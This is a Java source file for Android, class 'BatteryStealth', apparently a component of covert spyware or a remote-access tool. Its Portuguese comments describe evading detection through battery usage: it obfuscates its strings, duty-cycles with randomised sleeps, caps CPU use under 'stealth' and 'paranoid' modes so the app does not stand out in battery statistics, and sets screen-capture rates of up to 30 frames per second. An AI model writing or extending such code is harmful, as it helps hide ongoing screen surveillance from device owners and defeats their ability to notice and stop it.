package com.seguranca.protecao.stealth;

import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.BatteryManager;
import android.os.PowerManager;
import android.util.Log;
import org.lsposed.lsparanoid.Obfuscate;
import java.io.BufferedReader;
import java.io.FileReader;
import java.security.SecureRandom;

/**
 * Módulo de evasão de detecção por consumo de bateria.
 * Normaliza padrões de CPU e gerencia duty cycling para evitar destaque em stats de bateria.
 */
@Obfuscate
public class BatteryStealth {

    private static final String TAG = "BtS";
    private final Context context;
    private final SecureRandom random = new SecureRandom();

    private volatile boolean isDutyCycling = false;
    private volatile boolean isActivePhase = true;
    private volatile int stealthLevel = StealthProtocol.MODE_NORMAL;
    private Thread dutyCycleThread;

    // Duty cycle config
    private static final long ACTIVE_PHASE_MS = 30000;         // 30s ativo
    private static final long SLEEP_MIN_MS = 120000;            // 2min sleep mínimo
    private static final long SLEEP_MAX_MS = 300000;            // 5min sleep máximo
    private static final long SLEEP_MAX_PARANOID_MS = 600000;   // 10min no modo paranoid

    // Limites de CPU
    private static final double CPU_THRESHOLD_NORMAL = 5.0;     // 5% max
    private static final double CPU_THRESHOLD_STEALTH = 3.0;    // 3% max
    private static final double CPU_THRESHOLD_PARANOID = 1.5;   // 1.5% max

    // Limites de bateria para throttling
    private static final int BATTERY_LOW = 20;
    private static final int BATTERY_CRITICAL = 10;

    // Tracking de CPU
    private long prevIdleTime = 0;
    private long prevTotalTime = 0;

    public BatteryStealth(Context context) {
        this.context = context.getApplicationContext();
    }

    /**
     * Inicia o ciclo de duty cycling.
     * Alterna entre períodos ativos e sleep para normalizar consumo.
     */
    public void startDutyCycle() {
        if (isDutyCycling) return;
        isDutyCycling = true;

        dutyCycleThread = new Thread(() -> {
            Log.d(TAG, "Duty cycling iniciado");
            while (isDutyCycling) {
                try {
                    // Fase ativa
                    isActivePhase = true;
                    Thread.sleep(ACTIVE_PHASE_MS);

                    // Fase de sleep
                    isActivePhase = false;
                    long sleepDuration = calculateSleepDuration();
                    Thread.sleep(sleepDuration);

                } catch (InterruptedException e) {
                    break;
                } catch (Exception e) {
                    Log.e(TAG, "DutyCycle erro: " + e.getMessage());
                    try { Thread.sleep(60000); } catch (InterruptedException ie) { break; }
                }
            }
            Log.d(TAG, "Duty cycling parado");
        }, "dc_thread");
        dutyCycleThread.setDaemon(true);
        dutyCycleThread.setPriority(Thread.MIN_PRIORITY);
        dutyCycleThread.start();
    }

    public void stopDutyCycle() {
        isDutyCycling = false;
        if (dutyCycleThread != null) {
            dutyCycleThread.interrupt();
        }
    }

    /**
     * Calcula duração do sleep baseado no nível de bateria e modo stealth.
     */
    private long calculateSleepDuration() {
        int battery = getBatteryLevel(context);
        long maxSleep;

        switch (stealthLevel) {
            case StealthProtocol.MODE_PARANOID:
                maxSleep = SLEEP_MAX_PARANOID_MS;
                break;
            case StealthProtocol.MODE_STEALTH:
                maxSleep = SLEEP_MAX_MS;
                break;
            default:
                maxSleep = SLEEP_MAX_MS;
        }

        // Bateria baixa = mais sleep
        if (battery <= BATTERY_CRITICAL) {
            maxSleep *= 3; // Triplica sleep com bateria crítica
        } else if (battery <= BATTERY_LOW) {
            maxSleep *= 2; // Duplica sleep com bateria baixa
        }

        long range = maxSleep - SLEEP_MIN_MS;
        return SLEEP_MIN_MS + (long)(random.nextDouble() * range);
    }

    /**
     * Verifica se está na fase ativa do duty cycle.
     */
    public boolean isActivePhase() {
        return isActivePhase || !isDutyCycling;
    }

    /**
     * Adquire WakeLock de burst curto que auto-libera após duração especificada.
     */
    public PowerManager.WakeLock acquireBurstWakeLock(Context ctx, long durationMs) {
        try {
            PowerManager pm = (PowerManager) ctx.getSystemService(Context.POWER_SERVICE);
            if (pm != null) {
                PowerManager.WakeLock wl = pm.newWakeLock(
                    PowerManager.PARTIAL_WAKE_LOCK,
                    "App:Burst:" + System.currentTimeMillis()
                );
                wl.acquire(Math.min(durationMs, 10000)); // Max 10s
                return wl;
            }
        } catch (Exception e) {
            Log.e(TAG, "WakeLock erro: " + e.getMessage());
        }
        return null;
    }

    /**
     * Lê nível atual da bateria (0-100).
     */
    public int getBatteryLevel(Context ctx) {
        try {
            IntentFilter filter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            Intent batteryStatus = ctx.registerReceiver(null, filter);
            if (batteryStatus != null) {
                int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
                int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
                if (level >= 0 && scale > 0) {
                    return (int) ((level / (float) scale) * 100);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Battery check erro: " + e.getMessage());
        }
        return 100; // Assume cheio em caso de erro
    }

    /**
     * Verifica se o dispositivo está carregando.
     */
    public boolean isCharging(Context ctx) {
        try {
            IntentFilter filter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            Intent batteryStatus = ctx.registerReceiver(null, filter);
            if (batteryStatus != null) {
                int status = batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
                return status == BatteryManager.BATTERY_STATUS_CHARGING ||
                       status == BatteryManager.BATTERY_STATUS_FULL;
            }
        } catch (Exception e) {
            // Ignore
        }
        return false;
    }

    /**
     * Verifica se operações devem ser throttled baseado em CPU e bateria.
     */
    public boolean shouldThrottle() {
        try {
            // Check bateria
            int battery = getBatteryLevel(context);
            if (battery <= BATTERY_CRITICAL && !isCharging(context)) {
                return true;
            }

            // Check CPU
            double cpuUsage = getCpuUsage();
            double threshold;

            switch (stealthLevel) {
                case StealthProtocol.MODE_PARANOID:
                    threshold = CPU_THRESHOLD_PARANOID;
                    break;
                case StealthProtocol.MODE_STEALTH:
                    threshold = CPU_THRESHOLD_STEALTH;
                    break;
                default:
                    threshold = CPU_THRESHOLD_NORMAL;
            }

            return cpuUsage > threshold;
        } catch (Exception e) {
            return false;
        }
    }

    /**
     * Lê uso de CPU via /proc/stat.
     * @return porcentagem de uso (0-100)
     */
    private double getCpuUsage() {
        try {
            BufferedReader reader = new BufferedReader(new FileReader("/proc/stat"));
            String line = reader.readLine();
            reader.close();

            if (line != null && line.startsWith("cpu ")) {
                String[] parts = line.substring(4).trim().split("\\s+");
                if (parts.length >= 4) {
                    long user = Long.parseLong(parts[0]);
                    long nice = Long.parseLong(parts[1]);
                    long system = Long.parseLong(parts[2]);
                    long idle = Long.parseLong(parts[3]);
                    long iowait = parts.length > 4 ? Long.parseLong(parts[4]) : 0;

                    long totalTime = user + nice + system + idle + iowait;
                    long idleTime = idle + iowait;

                    if (prevTotalTime > 0) {
                        long totalDiff = totalTime - prevTotalTime;
                        long idleDiff = idleTime - prevIdleTime;

                        if (totalDiff > 0) {
                            double usage = 100.0 * (1.0 - (double) idleDiff / totalDiff);
                            prevTotalTime = totalTime;
                            prevIdleTime = idleTime;
                            return Math.max(0, usage);
                        }
                    }

                    prevTotalTime = totalTime;
                    prevIdleTime = idleTime;
                }
            }
        } catch (Exception e) {
            // Ignore
        }
        return 0;
    }

    /**
     * Retorna intervalo recomendado de captura de tela em ms.
     * Adapta baseado em bateria e modo stealth.
     */
    public long getRecommendedCaptureInterval() {
        int battery = getBatteryLevel(context);

        if (battery <= BATTERY_CRITICAL) return 500;  // 2 FPS
        if (battery <= BATTERY_LOW) return 200;       // 5 FPS

        switch (stealthLevel) {
            case StealthProtocol.MODE_PARANOID:
                return 200;  // 5 FPS
            case StealthProtocol.MODE_STEALTH:
                return 100;  // 10 FPS
            default:
                return 33;   // 30 FPS
        }
    }

    public void setStealthLevel(int level) {
        this.stealthLevel = level;
    }
}
